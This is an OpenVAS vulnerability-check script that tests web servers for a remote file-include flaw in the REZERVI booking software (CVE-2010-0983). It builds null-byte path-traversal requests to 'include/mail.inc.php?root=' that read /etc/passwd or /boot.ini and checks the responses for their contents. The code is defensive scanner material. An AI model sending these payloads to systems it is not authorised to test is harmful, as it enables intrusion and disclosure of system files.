###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_rezervi_37589.nasl 14 2013-10-27 12:33:37Z jan $
#
# REZERVI Belegungsplan und G�stedatenbank 'include/mail.inc.php' Remote File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "UTILO REZERVI Belegungsplan und G�stedatenbank is prone to a remote
file-include vulnerability because it fails to properly sanitize user-
supplied input.

An attacker can exploit this issue to include an arbitrary remote file
containing malicious PHP code and execute it in the context of the
webserver process. This may facilitate a compromise of the application
and the underlying system; other attacks are also possible.

REZERVI Belegungsplan und G�stedatenbank 3.0.2 is vulnerable; other
versions may also be affected.";


if (description)
{
 script_id(100635);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-05-11 20:07:01 +0200 (Tue, 11 May 2010)");
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2010-0983");
 script_bugtraq_id(37589);

 script_name("REZERVI Belegungsplan und G�stedatenbank 'include/mail.inc.php' Remote File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/37589");
 script_xref(name : "URL" , value : "http://www.utilo.eu/joomla15/index.php/produkte-mainmenu-73/rezervi-mainmenu-45.html");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if REZERVI is prone to a file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/rezervi",cgi_dirs());
files = make_array("root:.*:0:[01]:","/etc/passwd","\[boot loader\]","/boot.ini");

foreach dir (dirs) {
   
  url = string(dir, "/left.php"); 

  if(http_vuln_check(port:port, url:url,pattern:"Rezervi")) {
    
    foreach file (keys(files)) {

      url = string(dir, "/include/mail.inc.php?root=",files[file],"%00");

      if(http_vuln_check(port:port, url:url,pattern:file)) {

        security_hole(port:port);
        exit(0);

      }	
    }  
  }
}

exit(0);